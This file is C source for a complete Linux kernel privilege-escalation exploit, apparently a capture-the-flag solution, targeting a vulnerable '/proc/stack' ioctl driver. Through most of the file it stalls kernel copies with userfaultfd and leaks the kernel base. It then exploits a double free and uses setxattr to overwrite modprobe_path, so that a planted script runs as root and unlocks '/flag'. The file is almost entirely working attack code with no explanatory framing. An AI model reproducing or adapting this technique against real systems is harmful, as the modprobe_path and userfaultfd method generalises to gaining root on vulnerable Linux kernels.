#include <sys/xattr.h>
#include <sys/ipc.h> 
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

static int page_size;
int fd;
int procfd;
int phase = 1;

unsigned long leak_heap, leak_base, modprobe_path;

void push(unsigned long *val) {
    if (ioctl(fd, CMD_PUSH, val) < 0) {
        errExit("push");
    }
}

void pop(unsigned long *val) {
    if (ioctl(fd, CMD_POP, val) < 0) {
        errExit("pop");
    }
}

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

       /* See what poll() tells us about the userfaultfd */

       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       /* Read an event from the userfaultfd */

       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)
           errExit("read");

       /* We expect only one kind of event; verify that assumption */

       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */

       if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            printf("write fault\n");

            unsigned long tmp;
            pop(&tmp);

            struct uffdio_range range;
            range.start = msg.arg.pagefault.address & ~(page_size - 1);
            range.len = page_size;
            if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                errExit("ioctl-UFFDIO_UNREGISTER");
            if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                errExit("ioctl-UFFDIO_WAKE");
       } else {
           printf("read fault\n");
           unsigned long tmp = 0x12121212;
           if (phase == 1) {
               pop(&tmp);
               printf("leak base: %lx\n", tmp);
               leak_base = tmp;
               phase++;
           } else {
               printf("in setxattr\n");
               strncpy(&tmp, "/tmp/x", 8);
               push(&tmp);
               push(&tmp);
               system("/tmp/dummy");
               system("cat /flag");
           }

           *(unsigned long int *)page = 0;
           fault_cnt++;

           uffdio_copy.src = (unsigned long) page;

           uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
           uffdio_copy.len = page_size;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
               errExit("ioctl-UFFDIO_COPY");
        }
    }
}

int main() {

    // 1. Setup userfaultfd

    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 4 * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
       errExit("mmap");

    /* Register the memory range of the mapping we just created for
      handling by the userfaultfd object. In mode, we request to track
      missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }

    // 2. Begin exploit

    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    fd = open("/proc/stack", O_RDWR);
    if (fd < 0) errExit("open");

    unsigned long value = 0xdeadbeef;

    int shmid = shmget(0x66, 0x1000, SHM_R | SHM_W | IPC_CREAT);
    char *shm_addr;
    if (shmid < 0) {
        errExit("shmget");
    }
    shm_addr = shmat(shmid, 0, 0);
    if (shm_addr == -1) {
        errExit("shmat");
    }
    shmdt(shm_addr);

    push(addr);

    push(&value);
    pop(addr+page_size);

    // At this time, there is a freed chunk points to itself.
    
    modprobe_path = leak_base + (0xFFFFFFFF81C2C540 - 0xffffffff81c37bc0);
    printf("modprobe_path: %lx\n", modprobe_path);

    // Let first 8 bytes copy succeeds to overwrite fd, then stop at userfault handler.
    *(unsigned long *)(addr+2*page_size-8) = modprobe_path - 8;
    setxattr("/init", "attr", addr+2*page_size-8, 32, 0);

    return 0;
}